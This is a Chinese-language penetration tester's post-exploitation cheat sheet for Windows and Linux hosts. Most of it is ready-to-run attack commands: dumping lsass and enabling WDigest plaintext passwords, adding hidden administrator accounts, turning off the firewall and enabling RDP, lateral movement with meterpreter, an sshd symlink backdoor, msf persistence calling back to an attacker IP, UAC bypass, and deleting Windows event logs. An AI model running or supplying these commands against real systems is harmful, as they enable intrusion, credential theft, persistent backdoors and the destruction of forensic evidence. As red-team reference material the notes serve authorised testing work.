# 信息收集

- 出网端口扫描.输出到文件。
- [后渗透之 windows 中无文件落地执行方法](https://mp.weixin.qq.com/s/-rN-rsnYRSKuJr5BkaRnBg)
- dump 密码
  - 任务管理器转储
  - procdump64.exe -accepteula -ma lsass.exe lsass.dmp

```sh
# -- windows
arp -a
ipconfig /all
dir /a C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent
dir /a C:\Users\Administrator\Desktop
dir /a C:\Users\public\Desktop
reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
# for /f "tokens=2 delims==" %a in ('wmic useraccount where name^="%username%" get sid /value') do set current_sid=%a
# reg query HKEY_USERS\%current_sid%\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
# reg query HKEY_USERS\S-1-5-21-3921407625-4142045542-3089788233-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU  # 远程连接信息
reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
reg export "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" Winlogon.reg
dir D:\ /s | findstr /i ora >c:\tmp.txt # 查找ora文件
dir /s /b *admin*                       # 查找admin相关文件.
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f   # 允许pth登录
shell net user defaultuser1 123 /add && net localgroup administrators defaultuser1 /add
# 查询数据库连接IP记录 见 30_mssql_sqlserver.md

netstat -lantp | grep ESTABLISHED # 关注sshd进程，即运维人员公司IP

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f # 管理员登录可读明文

# -- linux
/etc/passwd
/home/<username>/.bash_history
```

- [查询数据库连接 IP 记录](./30_mssql_sqlserver.md#查询日志访问-ip数据库)

## web 路径

```
C:\tomcat\webapps\xxxx\WEB-INF\web.xml
```

## windows

```shell
## 提权
JuicyPotato
SweetPotato
echo 其他漏洞见 z02
## 横向
meter> upload /root/fscan64.exe # 1.ipconfig 查看网段, # 2.arp -a # 2.1 route print # 3. fscan扫描 横向移动
meterpreter > run post/windows/manage/enable_rdp # 开 rdp
meterpreter > run getgui -e                      # 开启远程桌面
meterpreter > run getgui -u xiaowei -p 123456    # 创建用户
### [『红蓝对抗』RDP 多开小技巧 | 远程桌面](https://mp.weixin.qq.com/s/ji7YpWe1OyyhSlDOYydzWw)
# 远程桌面 要求的函数不受支持
# reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /t reg_dword /v AllowEncryptionOracle /d 2
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1                              # 开启3389远程桌面
netsh advfirewall set allprofiles state off
netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes                                 # M2: 放行3389
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow # M1: 放行3389

# 远程桌面 rdp
proxychains rdesktop 192.168.52.141  # 可以改过期密码
proxychains rdesktop 172.22.4.45 -u 'WIN19\Adrian' -p babygirl2 -r disk:home=/home/kali/vmware/test/rw
rdesktop -u yourname -p password -g 1024x720 192.168.0.2
rdesktop -r disk:tmp=/home/user/Desktop <remote ip address> # 映射文件夹
remmina # 可配代理 见 90_tools.md
freerdp
xfreerdp


net config Workstation # (当前计算机名，全名，用户名，系统版本，工作站域，登陆域)
net localgroup administrators
net view # 查看局域网内所有计算机
使用CS扩展的Ladon插件探测内网存活主机情况
Ladon 192.168.52.0/24 OnlinePC
net view /domain 查看域情况
CS和msf联动

# 内网主机信息收集
## * everything文件搜索（正则表达式提高效率）
## * 浏览器保存的密码/微信/QQ文件夹/回收站/共享盘/邮件软件/协同软件
## * 远程软件保存的远程连接 mstsc/内网通/向日葵/todesk等

```

### 多用户登录远程桌面

[RDP 连接多开方法与利用思路](https://mp.weixin.qq.com/s/GCFCIwqnQUAFNED0dTVDoA)

```bash
net user admin 123456 /add
net localgroup administrators admin /add
net localgroup "Remote Desktop Users" admin /add 2>nul

# 1. 不同用户同时登录
mimikatz.exe privilege::Debug ts::multirdp exit
# 2. 同用户同时登录 RDPWrap, 好像不好使
install.bat
rdpconf.exe  # 取消 Single Session
## 2.1 win10+win11 http://github.com/anhkgg/SuperRDP
```

## linux

[Linux 内网渗透基础篇](https://mp.weixin.qq.com/s/MV4bTIW7YKiBgS6r03_FFw)

```shell
get_info_01_linux.sh
meterpreter > getSystem "whoami"

uname -a    # 获取所有版本信息
uname -m    # 获取Linux内核架构
cat /proc/version    # 获取内核信息
cat /etc/*-release   # 发布信息
cat /etc/issue    # 发布信息
hostname    # 获取主机名
cat /etc/passwd    # 列出系统所有用户
cat /etc/group    # 列出系统所有组
w    # 查看目前登录的用户
whoami    # 查看当前用户
id    # 查看当前用户信息
sudo -l    # 列出目前用户可执行与无法执行的指令
ps aux    # 查看进程信息
ls -la /etc/cron*    # 查看计划任务
ls -la /tmp
ifconfig -a    # 列出网络接口信息
cat /etc/network/interfaces    # 列出网络接口信息
arp -a    # 查看系统arp表
route    # 打印路由信息
netstat -anplt    # 打印本地端口开放信息
iptables -L    # 列出iptable的配置规则
```

wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:“KBxxxxxx”

## 权限维持

ssh 软连接后门 需 root 执行后门命令，任意密码登录

```shell
ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345
```

- [msf](https://mp.weixin.qq.com/s/Ch73sZqK54HVlJQEhbBb6g)

msf 维持 1 run persistence

```bash
run persistence –h #查看帮助
run persistence -U -i 5 -p 1234 -r 192.168.47.128
#-U指定启动的方式为用户登录时，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
```

msf 维持 2 metsvc

```bash
run metsvc –h # 查看帮助
run metsvc –A #自动安装后门
```

## 日志清除

```ps1
$a=Get-WmiObject -Class win32_service -Filter "name = 'eventlog'"
taskkill /F /PID $a.ProcessId
del %SystemRoot%\System32\winevt\Logs\*
net start EventLog
```

# 04 自动信息收集

Host Information Gathering Script：HIGS.bat
https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat
privilege-escalation-awesome-scripts：winPEAS.bat
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat

# 提权工具脚本

https://blog.csdn.net/weixin_43873557/article/details/113760973

快速查找 exp

systeminfo>micropoor.txt&(for %i in ( KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt

https://github.com/SecWiki/windows-kernel-exploits
https://github.com/WindowsExploits/Exploits

## ssh 相关

1.密钥篡改 authorized_keys 2.重装覆盖 openssh-backdoor https://github.com/Psmths/openssh-backdoor

### bypassuac

1. msf

```bash
search bypassuac
use exploit/windows/local/bypassuac
options
set session 1
run -j
getuid
getsystem
```

2. CVE 编号:CVE-2019-1388,windwos 证书对话框特权提升漏洞。补丁号 KB4524235 KB4525233

# Article

[后渗透之 windows 中无文件落地执行方法](https://mp.weixin.qq.com/s/GqgFDi8hJ3NcN8c98yIXuw)
[后渗透之 windows 中远程下载文件 tips](https://mp.weixin.qq.com/s/Ax0CaErM3F6VCctTB2KaHA)
